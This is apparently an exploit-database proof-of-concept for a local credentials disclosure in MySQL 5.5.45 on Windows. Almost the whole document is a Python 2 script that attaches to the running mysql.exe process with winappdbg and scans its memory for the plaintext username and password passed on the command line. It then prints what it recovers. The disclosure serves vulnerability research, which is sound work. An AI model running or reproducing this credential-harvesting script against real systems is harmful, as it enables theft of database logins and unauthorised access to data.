#####
# MySQL 5.5.45 (64bit) Local Credentials Disclosure
# Tested on Windows Windows Server 2012 R2 64bit, English
# Vendor Homepage @ https://www.mysql.com
# Date 05/09/2016
# Bug Discovered by Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
#
# http://www.black-rose.ml
#
# Special Thanks & Greetings to friend of mine Viktor Minin (https://www.exploit-db.com/author/?a=8052) | (https://1-33-7.com/)
#####
# MySQL v5.5.45 is vulnerable to local credentials disclosure, the supplied username and password are stored in a plaintext format in memory process.
# A potential attacker could reveal the supplied username and password in order to gain access to the database.
# Proof-Of-Concept Code:
#####

import time
from winappdbg import Debug, Process

def b2h(str):
    return ''.join(["%02X " % ord(x) for x in str]).strip()

def h2b(str):
	bytes = []
	str = ''.join(str.split(" "))

	for i in range(0, len(str), 2):
		bytes.append(chr(int(str[i:i+2], 16)))

	return ''.join(bytes)

usr 		= ''
pwd 		= ''
count 		= 0
filename 	= "mysql.exe"
process_pid = 0
memory_dump	= []
passwd 		= []

debug = Debug()
try:
	print "[~] Searching for pid by process name '%s'.." % (filename)
	time.sleep(1)
	debug.system.scan_processes()
	for (process, process_name) in debug.system.find_processes_by_filename(filename):
		process_pid = process.get_pid()
	if process_pid is not 0:
		print "[+] Found process pid #%d" % (process_pid)
		time.sleep(1)
		print "[~] Trying to read memory for pid #%d" % (process_pid)
		
		process = Process(process_pid)
		for address in process.search_bytes('\x00\x6D\x79\x73\x71\x6C\x00\x2D\x75\x00'):
			memory_dump.append(process.read(address,30))
		for i in range(len(memory_dump)):
			str = b2h(memory_dump[i])
			first = str.split("00 6D 79 73 71 6C 00 2D 75 00 ")[1]
			last = first.split(" 00 2D 70")
			if last[0]:
				usr = h2b(last[0])
		
		memory_dump = []
		for address in process.search_bytes('\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'):
			memory_dump.append(process.read(address,100))
		sorted(set(memory_dump))
		for i in range(len(memory_dump)):
			str = b2h(memory_dump[i])
			string = str.split('00 8F')
			for x in range(len(string)):
				if x == 1:
					passwd = string
		try:
			pwd = h2b(passwd[1].split('00 00')[0])
		except:
			pass
		
		print "[~] Trying to extract credentials from memory.."
		time.sleep(1)
		if usr != '' and pwd != '':
			print "[+] Credentials found!\r\n----------------------------------------"
			print "[+] Username: %s" % usr
			print "[+] Password: %s" % pwd
		else:
			print "[-] Credentials not found!"
	else:
		print "[-] No process found with name '%s'" % (filename)
	
	debug.loop()
finally:
    debug.stop()